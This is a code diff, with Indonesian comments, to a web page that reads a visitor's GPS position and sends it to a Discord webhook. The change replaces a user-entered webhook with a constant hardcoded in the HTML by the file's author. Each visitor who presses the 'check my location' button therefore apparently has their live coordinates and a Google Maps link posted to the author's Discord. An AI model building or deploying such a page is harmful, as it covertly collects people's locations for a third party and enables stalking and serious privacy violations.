@@ -452,17 +452,14 @@ function setStatus(msg, cls='') {
 }
 
 function startGPS() {
-  const webhook = document.getElementById('webhook-input').value.trim();
-  if (!webhook.startsWith('https://discord.com/api/webhooks/')) {
-    setStatus('✕ URL webhook tidak valid!', 'err');
+  if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('WEBHOOK_ID')) {
+    setStatus('✕ Edit DISCORD_WEBHOOK di HTML dulu!', 'err');
     return;
   }
   if (!navigator.geolocation) {
     setStatus('✕ Browser tidak support GPS', 'err');
     return;
   }
-
-  localStorage.setItem('wh', btoa(webhook));
 
   if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId=null; }
   kalman.reset(); sampleCount=0; lastSent=null; lastFiltered=null;
@@ -507,10 +504,14 @@ function onErr(err) {
   setStatus('✕ ' + (msgs[err.code] || err.message), 'err');
 }
 
+// ══════════════════════════════════════════════
+// EDIT WEBHOOK URL DI SINI:
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN';
+// ══════════════════════════════════════════════
+
 async function sendToDiscord(data) {
-  const raw = localStorage.getItem('wh');
-  if (!raw) return;
-  const webhook = atob(raw);
+  const webhook = DISCORD_WEBHOOK;
+  if (!webhook || webhook.includes('WEBHOOK_ID')) return;
   lastSent = Date.now();
 
   const mapsUrl = `https://www.google.com/maps?q=${data.lat},${data.lng}`;
@@ -547,10 +548,8 @@ async function sendToDiscord(data) {
 
 /* ── CEK LOKASI SAYA (tombol hero) ── */
 function cekLokasi() {
-  const raw = localStorage.getItem('wh');
-  if (!raw) {
-    document.getElementById('gps-overlay').classList.add('show');
-    setStatus('⚠ Set webhook dulu sebelum lanjut.', 'err');
+  if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('WEBHOOK_ID')) {
+    alert('Edit dulu DISCORD_WEBHOOK di dalam file HTML!');
     return;
   }
 
@@ -597,12 +596,10 @@ function cekLokasi() {
   );
 }
 
-/* ── Auto-load webhook dari storage ── */
+/* ── Auto-load: isi webhook input dari const ── */
 window.addEventListener('load', () => {
-  const raw = localStorage.getItem('wh');
-  if (raw) {
-    try { document.getElementById('webhook-input').value = atob(raw); } catch(e){}
-  }
+  const inp = document.getElementById('webhook-input');
+  if (inp && !DISCORD_WEBHOOK.includes('WEBHOOK_ID')) inp.value = DISCORD_WEBHOOK;
 });
 </script>
 </body>
